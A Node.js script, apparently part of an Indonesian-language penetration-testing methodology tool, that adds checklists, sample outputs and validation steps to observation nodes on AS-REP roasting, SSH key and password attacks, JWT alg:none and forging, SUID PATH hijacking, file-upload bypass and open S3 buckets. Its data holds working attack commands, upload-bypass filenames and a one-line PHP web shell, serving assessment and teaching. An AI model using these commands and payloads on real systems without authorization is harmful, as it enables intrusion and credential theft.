/**
 * enrich-batch2.mjs â€” Batch 2 enrichment for remaining sparse nodes
 * Targets: AD nodes, network key nodes, privesc remaining, web key nodes
 */
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const OBS_DIR = path.resolve(__dirname, '../src/data/observations');

const enrichments = {

  // â”€â”€ Active Directory â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

  'obs-ad-asrep-roastable': {
    inspection_points_add: [
      {
        id: 'asrep-identify-accounts',
        name: '2. Identifikasi & Validasi Akun Target',
        why_check: 'Tidak semua akun yang berhasil di-enumerate memiliki flag DONT_REQ_PREAUTH â€” perlu memverifikasi secara selektif.',
        what_to_look_for: [
          'GetNPUsers.py DOMAIN/ -no-pass -usersfile users.txt -format hashcat',
          'GetNPUsers.py DOMAIN/validuser:pass -request -format john',
          'Cek UserAccountControl via LDAP: (userAccountControl:1.2.840.113556.1.4.803:=4194304)',
          'Identifikasi akun service atau legacy yang biasanya memiliki flag ini'
        ],
        normal_baseline: 'Semua akun memerlukan Kerberos pre-authentication. GetNPUsers mengembalikan: KDC_ERR_PREAUTH_REQUIRED.',
        interesting_clues: [
          'GetNPUsers berhasil mendapatkan AS-REP hash ($krb5asrep$)',
          'Lebih dari satu akun memiliki flag DONT_REQ_PREAUTH',
          'Akun service atau legacy seperti svc_backup, svc_sql memiliki flag ini'
        ],
        evidence_to_capture: [
          'Full AS-REP hash ($krb5asrep$23$user@domain:...) untuk offline cracking',
          'List akun yang berhasil di-roast',
          'Timestamp request untuk dokumentasi scope'
        ]
      },
      {
        id: 'asrep-crack-offline',
        name: '3. Offline Cracking Hash AS-REP',
        why_check: 'Hash AS-REP dapat di-crack secara offline tanpa interaksi lebih lanjut ke DC.',
        what_to_look_for: [
          'hashcat -m 18200 hash.txt rockyou.txt --force',
          'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt',
          'Estimasi waktu crack berdasarkan kompleksitas hash',
          'Gunakan rule-based attack jika wordlist dasar gagal'
        ],
        normal_baseline: 'Hash tidak dapat di-crack dalam waktu reasonable dengan wordlist umum â€” password cukup kuat.',
        interesting_clues: [
          'Hash berhasil di-crack dalam hitungan detik/menit â†’ password lemah',
          'Plaintext password mengikuti pola organisasi (Company2023!, Season+Year)'
        ],
        evidence_to_capture: [
          'Plaintext password hasil cracking',
          'Hashcat/John status output',
          'Waktu yang dibutuhkan untuk crack'
        ]
      }
    ],
    interesting_signals_add: [
      {
        id: 'sig-asrep-hash-obtained',
        inspection_point_id: 'asrep-identify-accounts',
        signal_description: 'GetNPUsers berhasil mengekstrak AS-REP hash dari satu atau lebih akun domain.',
        output_snippet: '$ GetNPUsers.py CORP/ -no-pass -usersfile users.txt -format hashcat\n$krb5asrep$23$jsmith@CORP:2a5f7b...[hash]...8c3d',
        observation_confidence: 'CONFIRMED_OBSERVATION',
        interpretation: 'Hash dapat di-crack offline â€” jika berhasil, attacker mendapat credential valid untuk lateral movement.',
        hypothesis_id: 'hyp-asrep-cracked-lateral',
        evidence_to_capture: ['Full AS-REP hash string', 'Username yang terkena']
      }
    ],
    hypotheses_add: [
      {
        id: 'hyp-asrep-cracked-lateral',
        name: 'Lateral Movement Post AS-REP Roasting',
        description: 'Credential dari AS-REP roasting digunakan untuk autentikasi ke mesin lain dalam domain.',
        status: 'CANDIDATE',
        supporting_signals: ['sig-asrep-hash-obtained'],
        safe_validation_steps: [
          {
            step_number: 1,
            action: 'Crack hash: hashcat -m 18200 hash.txt rockyou.txt. Jika berhasil, verifikasi credential: crackmapexec smb DC_IP -u username -p "password"',
            expected_output: 'Hash tidak ter-crack atau credential tidak valid.',
            interesting_output: 'Credential valid: [+] CORP\\jsmith:Password123 (Pwn3d!)',
            unexpected_output: 'STATUS_ACCOUNT_LOCKED_OUT â€” account dikunci.',
            interpretation: 'Credential valid â†’ gunakan untuk SMB access, WinRM, atau pass-the-hash.',
            evidence_to_record: ['Plaintext credential', 'Bukti autentikasi berhasil ke mesin target']
          }
        ]
      }
    ]
  },

  // â”€â”€ Network: SSH â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

  'obs-net-ssh': {
    inspection_points_add: [
      {
        id: 'ssh-auth-methods',
        name: '2. Metode Autentikasi yang Diizinkan',
        why_check: 'Metode autentikasi yang tidak aman (password auth enabled, keyboard-interactive) memungkinkan brute-force.',
        what_to_look_for: [
          'ssh -v user@TARGET 2>&1 | grep "Authentications"',
          'nmap --script ssh-auth-methods -p 22 TARGET',
          'Periksa apakah PasswordAuthentication yes dalam konfigurasi server',
          'Cek algoritma kriptografi: ssh -Q kex, ssh -Q cipher'
        ],
        normal_baseline: 'Hanya publickey authentication diizinkan. PasswordAuthentication = no dalam sshd_config.',
        interesting_clues: [
          'Password authentication diizinkan â†’ potensi brute-force',
          'keyboard-interactive diizinkan â†’ potensi bypass 2FA',
          'Algoritma kuno diizinkan: diffie-hellman-group1-sha1, arcfour'
        ],
        evidence_to_capture: [
          'Output ssh -v tentang authentication methods',
          'Output nmap ssh-auth-methods',
          'Versi SSH server dan algoritma yang di-support'
        ]
      },
      {
        id: 'ssh-key-based-access',
        name: '3. Authorized Keys & Private Key Exposure',
        why_check: 'Private key yang bocor atau authorized_keys yang salah konfigurasi dapat memberikan akses tanpa password.',
        what_to_look_for: [
          'Cari ~/.ssh/ pada sistem setelah mendapat akses: ls -la ~/.ssh/',
          'Cek authorized_keys: apakah ada kunci dari host/user yang tidak dikenal?',
          'Scan direktori web, backup, git repo untuk private key (-----BEGIN RSA PRIVATE KEY-----)',
          'Cek .bash_history untuk penggunaan ssh-keygen atau scp dengan key'
        ],
        normal_baseline: 'Hanya public key pengguna yang sah dalam authorized_keys. Private key tidak ada di share atau web directory.',
        interesting_clues: [
          'Private key ditemukan di /var/www/, /backup/, atau git repository',
          'authorized_keys berisi kunci yang tidak dikenal dengan from= restriction lemah',
          'id_rsa tanpa passphrase ditemukan pada direktori home user'
        ],
        evidence_to_capture: [
          'Private key yang ditemukan (content untuk validasi, bukan untuk penyalahgunaan)',
          'Daftar authorized_keys dari server',
          'Path lengkap di mana key ditemukan'
        ]
      }
    ],
    interesting_signals_add: [
      {
        id: 'sig-ssh-password-auth',
        inspection_point_id: 'ssh-auth-methods',
        signal_description: 'SSH server mengizinkan password authentication â€” brute-force feasible.',
        output_snippet: '$ ssh -v user@192.168.1.20 2>&1 | grep Auth\ndebug1: Authentications that can continue: publickey,password,keyboard-interactive',
        observation_confidence: 'CONFIRMED_OBSERVATION',
        interpretation: 'Password auth aktif â†’ gunakan Hydra atau Medusa untuk brute-force dengan wordlist umum.',
        hypothesis_id: 'hyp-ssh-bruteforce',
        evidence_to_capture: ['Output ssh -v authentication methods', 'nmap script output']
      },
      {
        id: 'sig-ssh-private-key-exposed',
        inspection_point_id: 'ssh-key-based-access',
        signal_description: 'File private key SSH (id_rsa tanpa passphrase) ditemukan di lokasi yang dapat diakses.',
        output_snippet: '$ cat /var/www/html/.git/id_rsa\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA...',
        observation_confidence: 'CONFIRMED_OBSERVATION',
        interpretation: 'Private key tanpa passphrase dapat langsung digunakan untuk autentikasi ke server sebagai user terkait.',
        hypothesis_id: 'hyp-ssh-key-auth',
        evidence_to_capture: ['Lokasi file key', 'Output ssh -i id_rsa user@TARGET (verifikasi koneksi)']
      }
    ],
    hypotheses_add: [
      {
        id: 'hyp-ssh-bruteforce',
        name: 'SSH Credential Brute-Force (Password Authentication Enabled)',
        description: 'Password authentication aktif tanpa account lockout memungkinkan brute-force credential.',
        status: 'CANDIDATE',
        supporting_signals: ['sig-ssh-password-auth'],
        safe_validation_steps: [
          {
            step_number: 1,
            action: 'Verifikasi rate limiting: kirim 5 login gagal cepat, apakah koneksi diputus atau ada delay?',
            expected_output: 'Koneksi diputus setelah 3 percobaan gagal atau ada 30s delay.',
            interesting_output: 'Semua percobaan diterima tanpa throttling.',
            unexpected_output: 'IP langsung di-ban setelah 1 percobaan gagal (fail2ban aktif).',
            interpretation: 'Tanpa rate limiting â†’ brute-force dengan list kecil password umum feasible.',
            evidence_to_record: ['Response time sequence untuk 5 login gagal', 'Apakah ada banner fail2ban']
          }
        ]
      },
      {
        id: 'hyp-ssh-key-auth',
        name: 'Unauthorized SSH Access via Exposed Private Key',
        description: 'Private key yang ditemukan dapat digunakan langsung untuk autentikasi SSH tanpa password.',
        status: 'CANDIDATE',
        supporting_signals: ['sig-ssh-private-key-exposed'],
        safe_validation_steps: [
          {
            step_number: 1,
            action: 'chmod 600 id_rsa; ssh -i id_rsa [expected-user]@TARGET -o StrictHostKeyChecking=no',
            expected_output: 'Permission denied (publickey) â€” key tidak match dengan authorized_keys.',
            interesting_output: 'Shell prompt terbuka tanpa password prompt.',
            unexpected_output: 'Key terenkripsi dengan passphrase â€” perlu crack passphrase dulu.',
            interpretation: 'Shell terbuka â†’ full unauthorized access terkonfirmasi, severity Critical.',
            evidence_to_record: ['Output ssh command', 'Screenshot shell dengan `id` dan `hostname`']
          }
        ]
      }
    ]
  },

  // â”€â”€ Web: obs-web-jwt â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

  'obs-web-jwt': {
    inspection_points_add: [
      {
        id: 'jwt-algorithm-confusion',
        name: '2. Algorithm Confusion & Header Manipulation',
        why_check: 'JWT yang mengizinkan alg:none atau menerima RS256 diubah ke HS256 dengan public key sebagai secret adalah kerentanan kritis.',
        what_to_look_for: [
          'Decode header JWT: echo "HEADER" | base64 -d â†’ periksa alg dan kid',
          'Coba modifikasi alg: "none" lalu kirim tanpa signature',
          'Coba ubah RS256 â†’ HS256 dan sign dengan public key server',
          'Periksa apakah kid (Key ID) digunakan untuk lookup file: kid: "../../etc/passwd"'
        ],
        normal_baseline: 'Server menolak token dengan alg:none atau signature yang tidak valid dengan error 401/403.',
        interesting_clues: [
          'Server menerima token dengan alg: "none" dan signature kosong',
          'Server menerima token RS256â†’HS256 yang di-sign dengan public key',
          'kid parameter mengikuti path pada filesystem',
          'Token payload berisi field seperti role, admin, isAdmin yang dapat dimodifikasi'
        ],
        evidence_to_capture: [
          'Header JWT decoded (alg, kid, typ)',
          'Payload JWT decoded (claims)',
          'Response server setelah manipulasi algorithm'
        ]
      },
      {
        id: 'jwt-secret-weakness',
        name: '3. Weak Secret & Offline Cracking',
        why_check: 'HS256/HS512 JWT dengan secret lemah dapat di-crack offline untuk memalsukan token apapun.',
        what_to_look_for: [
          'Simpan full JWT token',
          'hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt',
          'john --format=HMAC-SHA256 --wordlist=rockyou.txt token.txt',
          'Coba common secrets: "secret", "password", nama aplikasi, "jwt_secret"'
        ],
        normal_baseline: 'Secret cukup panjang dan acak â€” crack tidak feasible dalam waktu reasonable.',
        interesting_clues: [
          'Secret ter-crack: secret="secret", "password123", nama_aplikasi',
          'Secret ditemukan dalam source code yang bocor',
          'Waktu crack < 1 menit dengan wordlist standar'
        ],
        evidence_to_capture: [
          'Token JWT original',
          'Secret yang berhasil di-crack',
          'Contoh token yang berhasil diforged dengan secret tersebut'
        ]
      }
    ],
    interesting_signals_add: [
      {
        id: 'sig-jwt-alg-none',
        inspection_point_id: 'jwt-algorithm-confusion',
        signal_description: 'Server menerima JWT dengan alg: "none" dan signature kosong â€” signature verification bypass.',
        output_snippet: '# Modified JWT dengan alg:none\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.\n\n# Response: HTTP 200 OK dengan data admin',
        observation_confidence: 'CONFIRMED_OBSERVATION',
        interpretation: 'Server tidak memvalidasi signature â€” attacker dapat membuat token dengan claim apapun (admin, root, arbitrary user ID).',
        hypothesis_id: 'hyp-jwt-alg-none-bypass',
        evidence_to_capture: ['Token asli', 'Token yang dimodifikasi', 'Response 200 OK dengan data yang di-claim']
      },
      {
        id: 'sig-jwt-weak-secret',
        inspection_point_id: 'jwt-secret-weakness',
        signal_description: 'HMAC secret berhasil di-crack dengan wordlist standar.',
        output_snippet: '$ hashcat -m 16500 token.txt rockyou.txt\nToken.$2y$10$... : secret\nSession..........: hashcat\nStatus...........: Cracked',
        observation_confidence: 'CONFIRMED_OBSERVATION',
        interpretation: 'Dengan secret yang diketahui, attacker dapat memalsukan token valid dengan claim apapun.',
        hypothesis_id: 'hyp-jwt-forged-token',
        evidence_to_capture: ['Secret plaintext', 'Token yang di-forge sebagai admin', 'Response server 200 OK']
      }
    ],
    hypotheses_add: [
      {
        id: 'hyp-jwt-alg-none-bypass',
        name: 'Authentication Bypass via JWT Algorithm None',
        description: 'Server menerima token tanpa signature â†’ attacker dapat mengklaim identitas user/admin apapun.',
        status: 'CANDIDATE',
        supporting_signals: ['sig-jwt-alg-none'],
        safe_validation_steps: [
          {
            step_number: 1,
            action: 'Buat token dengan alg:none, payload {"sub":"admin","role":"admin"}, signature kosong. Kirim ke endpoint /api/admin.',
            expected_output: '401 Unauthorized atau 403 Forbidden.',
            interesting_output: '200 OK dengan data admin panel.',
            unexpected_output: '500 Internal Server Error â€” parsing error.',
            interpretation: '200 OK â†’ authentication bypass terkonfirmasi, severity Critical.',
            evidence_to_record: ['Token yang digunakan', 'Response 200 dengan konten sensitif']
          }
        ]
      },
      {
        id: 'hyp-jwt-forged-token',
        name: 'Privilege Escalation via Forged JWT dengan Weak Secret',
        description: 'Secret yang di-crack memungkinkan pembuatan token valid dengan role admin atau user ID apapun.',
        status: 'CANDIDATE',
        supporting_signals: ['sig-jwt-weak-secret'],
        safe_validation_steps: [
          {
            step_number: 1,
            action: 'Forge token: python3 -c "import jwt; print(jwt.encode({\'sub\':\'admin\',\'role\':\'admin\'}, \'SECRET\', algorithm=\'HS256\'))"',
            expected_output: '403 Forbidden â€” secret salah atau validasi tambahan ada.',
            interesting_output: '200 OK dengan akses admin.',
            unexpected_output: 'Token diterima tapi data tidak berubah.',
            interpretation: 'Akses admin berhasil â†’ privilege escalation via JWT forgery, severity Critical.',
            evidence_to_record: ['Token yang di-forge', 'Response dengan admin access', 'Proof of secret']
          }
        ]
      }
    ]
  },

  // â”€â”€ PrivEsc: obs-priv-suid-binary â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

  'obs-priv-suid-binary': {
    inspection_points_add: [
      {
        id: 'suid-gtfobins-check',
        name: '3. GTFOBins Lookup & Shell Escape Technique',
        why_check: 'Banyak binary standar Linux memiliki metode shell escape terdokumentasi saat dijalankan sebagai SUID.',
        what_to_look_for: [
          'Periksa setiap binary SUID di https://gtfobins.github.io/',
          'Untuk custom binary: strings [binary] | grep -E "system|popen|exec|sh|bash"',
          'ltrace / strace [binary] untuk melihat system call',
          'Cek apakah binary memanggil program lain tanpa absolute path (PATH hijacking)'
        ],
        normal_baseline: 'Binary standar (passwd, ping, sudo) dengan SUID adalah normal. Binary custom tanpa dokumentasi jelas adalah anomali.',
        interesting_clues: [
          'Binary ada di GTFOBins dengan metode SUID',
          'Binary custom memanggil /bin/sh atau bash dalam code',
          'Binary memanggil program lain dengan relative path (PATH hijacking potential)',
          'Binary versi lama dengan CVE yang diketahui (screen-4.5.0, pkexec)'
        ],
        evidence_to_capture: [
          'GTFOBins URL dan payload untuk binary yang ditemukan',
          'Output strings untuk custom SUID binary',
          'Output id setelah berhasil exploit (dalam lab)'
        ]
      }
    ],
    hypotheses_add: [
      {
        id: 'hyp-suid-path-hijack',
        name: 'SUID Binary PATH Hijacking',
        description: 'Custom SUID binary memanggil program lain dengan relative path â€” attacker dapat memanipulasi PATH untuk menjalankan kode berbahaya sebagai root.',
        status: 'CANDIDATE',
        supporting_signals: [],
        safe_validation_steps: [
          {
            step_number: 1,
            action: 'Jalankan: strings /path/to/suid-binary | grep -v "/" | grep -E "^[a-z]" untuk menemukan program yang dipanggil tanpa absolute path.',
            expected_output: 'Semua program dipanggil dengan absolute path (/usr/bin/cat, /bin/sh).',
            interesting_output: 'Program dipanggil tanpa path: "service", "curl", "python".',
            unexpected_output: 'Binary stripped â€” gunakan ltrace/strace untuk analisis runtime.',
            interpretation: 'Relative path call â†’ buat binary palsu dengan nama sama di /tmp, tambahkan /tmp ke PATH, jalankan SUID binary.',
            evidence_to_record: ['Output strings', 'Nama program yang dipanggil tanpa path', 'PoC command untuk PATH hijacking']
          }
        ]
      }
    ]
  },

  // â”€â”€ Web: obs-web-file-upload â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

  'obs-web-file-upload': {
    inspection_points_add: [
      {
        id: 'upload-bypass-techniques',
        name: '2. Teknik Bypass Validasi Upload',
        why_check: 'Validasi file upload sering hanya dilakukan di client-side atau hanya cek extension â€” banyak cara bypass.',
        what_to_look_for: [
          'Ubah Content-Type header: image/jpeg â†’ application/x-php',
          'Coba double extension: shell.php.jpg, shell.php5, shell.phtml, shell.pHp',
          'Magic bytes: tambahkan GIF89a; di awal file PHP untuk lolos cek magic bytes',
          'Null byte: shell.php%00.jpg (untuk PHP versi lama)',
          'Perhatikan path direktori penyimpanan dari respons setelah upload'
        ],
        normal_baseline: 'Server menolak semua file non-image/non-document bahkan setelah manipulasi Content-Type dan extension.',
        interesting_clues: [
          'Server menerima file .phtml atau .php5 yang dapat dieksekusi',
          'Server menerima file dengan Content-Type dimanipulasi',
          'Response upload menampilkan path penyimpanan file (e.g., /uploads/shell.jpg)',
          'File yang diupload dapat diakses via URL publik dan dieksekusi server'
        ],
        evidence_to_capture: [
          'Request HTTP upload (method, headers, body) â€” Burp screenshot',
          'Response server setelah upload (path, URL)',
          'Bukti akses ke file yang diupload via URL',
          'Bukti eksekusi: response dari webshell yang diupload (dalam lab)'
        ]
      },
      {
        id: 'upload-storage-location',
        name: '3. Lokasi Penyimpanan & Eksekusi File',
        why_check: 'Bahkan jika file berbahaya berhasil diupload, perlu tahu apakah direktori penyimpanan dapat dieksekusi oleh web server.',
        what_to_look_for: [
          'Perhatikan response body setelah upload: ada URL atau path file?',
          'Coba akses URL file yang diupload langsung via browser',
          'Uji apakah server mengeksekusi script: upload file dengan <?php echo "PWNED"; ?>',
          'Cari direktori upload yang di-list di robots.txt, sitemap, atau error message'
        ],
        normal_baseline: 'File disimpan di luar web root atau dengan nama random yang tidak dapat ditebak. Eksekusi script di-disable dengan Options -ExecCGI.',
        interesting_clues: [
          'File tersimpan di /uploads/ yang dapat diakses langsung via browser',
          'Akses ke URL file mengembalikan konten PHP yang dieksekusi (bukan ditampilkan sebagai text)',
          'Direktori upload di-serve tanpa .htaccess yang melarang eksekusi'
        ],
        evidence_to_capture: [
          'URL lengkap file yang diupload',
          'Response HTTP saat mengakses file: apakah dieksekusi atau ditampilkan sebagai text',
          'Screenshot eksekusi PHP jika berhasil (dalam lab)'
        ]
      }
    ],
    interesting_signals_add: [
      {
        id: 'sig-upload-php-executed',
        inspection_point_id: 'upload-storage-location',
        signal_description: 'File PHP yang diupload berhasil dieksekusi oleh web server â€” Remote Code Execution confirmed.',
        output_snippet: '# Upload shell.php dengan konten: <?php system($_GET["cmd"]); ?>\nGET /uploads/shell.php?cmd=id\n\nHTTP/1.1 200 OK\nuid=33(www-data) gid=33(www-data) groups=33(www-data)',
        observation_confidence: 'CONFIRMED_OBSERVATION',
        interpretation: 'Web shell aktif â€” RCE terkonfirmasi. Attacker dapat menjalankan perintah sistem sebagai user web server.',
        hypothesis_id: 'hyp-upload-rce',
        evidence_to_capture: ['URL web shell', 'Output perintah id, whoami, hostname', 'Screenshot RCE (dalam lab)']
      }
    ],
    hypotheses_add: [
      {
        id: 'hyp-upload-rce',
        name: 'Remote Code Execution via File Upload Bypass',
        description: 'Validasi upload lemah memungkinkan attacker mengupload web shell PHP yang dapat dieksekusi server.',
        status: 'CANDIDATE',
        supporting_signals: ['sig-upload-php-executed'],
        safe_validation_steps: [
          {
            step_number: 1,
            action: 'Upload file dengan konten innocuous: <?php echo "TEST_EXEC_".phpversion(); ?> Akses URL-nya.',
            expected_output: 'Konten ditampilkan sebagai text plain atau download â€” tidak dieksekusi.',
            interesting_output: 'Response: "TEST_EXEC_8.1.2" â€” PHP dieksekusi oleh server.',
            unexpected_output: '403 Forbidden saat akses URL upload.',
            interpretation: 'Jika dieksekusi â†’ RCE terkonfirmasi tanpa menggunakan payload berbahaya. Severity Critical.',
            evidence_to_record: ['URL file upload', 'Response yang menampilkan phpversion()', 'Bukti eksekusi PHP']
          }
        ]
      }
    ]
  },

  // â”€â”€ Cloud: obs-cloud-s3-bucket â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

  'obs-cloud-s3-bucket': {
    inspection_points_add: [
      {
        id: 's3-write-permission',
        name: '2. Izin Write & Delete',
        why_check: 'Bucket dengan write permission memungkinkan data injection, hosting malicious content, atau data destruction.',
        what_to_look_for: [
          'aws s3 cp test.txt s3://BUCKET-NAME/test.txt --no-sign-request',
          'aws s3 rm s3://BUCKET-NAME/test.txt --no-sign-request (hapus setelah test)',
          'curl -X PUT "https://BUCKET.s3.amazonaws.com/test.txt" -d "test"',
          'Cek apakah bucket digunakan untuk static website hosting (potensi XSS via upload HTML)'
        ],
        normal_baseline: 'Upload ditolak dengan: Access Denied / 403 Forbidden untuk anonymous request.',
        interesting_clues: [
          'File berhasil di-upload tanpa autentikasi â†’ write access confirmed',
          'Bucket digunakan sebagai CDN atau static hosting â†’ upload HTML/JS = stored XSS',
          'File yang di-upload dapat diakses publik dari URL CloudFront'
        ],
        evidence_to_capture: [
          'Bukti upload berhasil: aws s3 ls s3://BUCKET setelah upload menampilkan file',
          'URL publik file yang berhasil di-upload',
          'Bukti hapus file test setelah verifikasi (cleanup)'
        ]
      },
      {
        id: 's3-sensitive-content',
        name: '3. Konten Sensitif dalam Bucket',
        why_check: 'Bucket publik sering mengandung data sensitif yang tidak seharusnya: backup database, config dengan credential, PII.',
        what_to_look_for: [
          'aws s3 ls s3://BUCKET --no-sign-request --recursive',
          'Cari file: *.sql, *.env, *.conf, *.json, *.bak, *.tar.gz, *.zip',
          'Periksa path: /backup/, /config/, /logs/, /exports/, /data/',
          'Download dan periksa isi file yang mencurigakan'
        ],
        normal_baseline: 'Bucket hanya berisi static assets publik (CSS, JS, gambar) tanpa file konfigurasi atau data user.',
        interesting_clues: [
          'File .env atau config.json dengan API keys atau database credentials',
          'SQL dump atau CSV dengan data PII (email, nama, nomor telepon)',
          'Private key atau sertifikat SSL dalam bucket publik'
        ],
        evidence_to_capture: [
          'List file sensitif yang ditemukan (path dan nama)',
          'Konten redacted dari file sensitif (jangan simpan data pribadi user)',
          'Klasifikasi data: PII, credential, kode sumber'
        ]
      }
    ],
    interesting_signals_add: [
      {
        id: 'sig-s3-write-success',
        inspection_point_id: 's3-write-permission',
        signal_description: 'File berhasil di-upload ke bucket S3 tanpa autentikasi.',
        output_snippet: '$ aws s3 cp test.txt s3://target-bucket/test.txt --no-sign-request\nupload: ./test.txt to s3://target-bucket/test.txt\n\n$ aws s3 ls s3://target-bucket/ --no-sign-request\n2024-01-15 10:23:45   4 test.txt',
        observation_confidence: 'CONFIRMED_OBSERVATION',
        interpretation: 'Write access anonymous â†’ data injection, phishing hosting, atau supply chain attack jika bucket digunakan sebagai CDN.',
        hypothesis_id: 'hyp-s3-write-abuse',
        evidence_to_capture: ['Bukti upload berhasil', 'URL publik file test', 'Hapus file test setelah dokumentasi']
      },
      {
        id: 'sig-s3-sensitive-file',
        inspection_point_id: 's3-sensitive-content',
        signal_description: 'File berisi credential, PII, atau data sensitif ditemukan dalam bucket publik.',
        output_snippet: '$ aws s3 ls s3://target-bucket/ --recursive --no-sign-request\n... backup/database_2024.sql\n... config/prod.env\n\n$ head prod.env\nDB_PASSWORD=SuperSecret123!\nAWS_SECRET_KEY=AKIA_EXAMPLE_KEY_REDACTED',
        observation_confidence: 'CONFIRMED_OBSERVATION',
        interpretation: 'Credential exposure langsung â€” database password atau cloud access key dapat digunakan untuk akses lebih dalam.',
        hypothesis_id: 'hyp-s3-credential-leak',
        evidence_to_capture: ['Nama file sensitif (redacted)', 'Jenis data yang ditemukan', 'Impact assessment']
      }
    ],
    hypotheses_add: [
      {
        id: 'hyp-s3-write-abuse',
        name: 'Bucket Write Abuse untuk Hosting Malicious Content / Supply Chain',
        description: 'Write access ke bucket yang digunakan sebagai CDN memungkinkan injeksi script berbahaya ke aplikasi web pengguna bucket.',
        status: 'CANDIDATE',
        supporting_signals: ['sig-s3-write-success'],
        safe_validation_steps: [
          {
            step_number: 1,
            action: 'Verifikasi: apakah bucket digunakan sebagai CDN atau static hosting? Cek CORS policy dan CloudFront distribution.',
            expected_output: 'Bucket adalah private storage tanpa public website hosting.',
            interesting_output: 'Bucket menghosting aset JS/CSS yang dimuat aplikasi produksi.',
            unexpected_output: 'Bucket diblokir setelah test write pertama (anomali detection).',
            interpretation: 'Jika file JS di bucket dimuat aplikasi â†’ write = supply chain attack vector.',
            evidence_to_record: ['URL CloudFront / CDN yang menggunakan bucket', 'Contoh skrip yang dimuat dari bucket']
          }
        ]
      },
      {
        id: 'hyp-s3-credential-leak',
        name: 'Credential dan Data PII Exposed di S3 Bucket Publik',
        description: 'File konfigurasi dengan credential atau data PII user dapat diunduh siapa saja yang tahu nama bucket.',
        status: 'CANDIDATE',
        supporting_signals: ['sig-s3-sensitive-file'],
        safe_validation_steps: [
          {
            step_number: 1,
            action: 'Download file sensitif. Verifikasi apakah credential masih aktif: aws sts get-caller-identity --access-key-id AKID --secret-access-key SECRET',
            expected_output: 'InvalidClientTokenId â€” credential tidak valid atau sudah expired.',
            interesting_output: 'Response berisi ARN dan account ID â€” credential masih aktif.',
            unexpected_output: 'ThrottlingException â€” terlalu banyak request.',
            interpretation: 'Credential aktif â†’ AWS account compromise, severity Critical. Laporkan segera ke pemilik.',
            evidence_to_record: ['Jenis file sensitif yang ditemukan', 'Apakah credential aktif (yes/no)', 'Account AWS yang terdampak']
          }
        ]
      }
    ]
  }
};

// â”€â”€â”€ APPLY ALL ENRICHMENTS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

function applyEnrichment(node, enrichment) {
  if (enrichment.inspection_points_add) {
    const existingIds = new Set((node.inspection_points || []).map(p => p.id));
    for (const ip of enrichment.inspection_points_add) {
      if (!existingIds.has(ip.id)) node.inspection_points.push(ip);
    }
  }
  if (enrichment.interesting_signals_add) {
    const existingIds = new Set((node.interesting_signals || []).map(s => s.id));
    for (const sig of enrichment.interesting_signals_add) {
      if (!existingIds.has(sig.id)) node.interesting_signals.push(sig);
    }
  }
  if (enrichment.hypotheses_add) {
    const existingIds = new Set((node.hypotheses || []).map(h => h.id));
    for (const hyp of enrichment.hypotheses_add) {
      if (!existingIds.has(hyp.id)) node.hypotheses.push(hyp);
    }
  }
  return node;
}

const files = fs.readdirSync(OBS_DIR).filter(f => f.endsWith('.json'));
let totalEnriched = 0;

for (const file of files) {
  const filePath = path.join(OBS_DIR, file);
  const nodes = JSON.parse(fs.readFileSync(filePath, 'utf8'));
  let changed = false;

  for (let i = 0; i < nodes.length; i++) {
    if (enrichments[nodes[i].id]) {
      const before = JSON.stringify(nodes[i]).length;
      nodes[i] = applyEnrichment(nodes[i], enrichments[nodes[i].id]);
      const after = JSON.stringify(nodes[i]).length;
      if (after > before) {
        console.log(`âœ… ${nodes[i].id}: IPs=${nodes[i].inspection_points.length}, Sigs=${nodes[i].interesting_signals.length}, Hyps=${nodes[i].hypotheses.length}`);
        changed = true;
        totalEnriched++;
      }
    }
  }

  if (changed) fs.writeFileSync(filePath, JSON.stringify(nodes, null, 2), 'utf8');
}

console.log(`\nâœ… Batch 2 enrichment done: ${totalEnriched} nodes enriched.`);

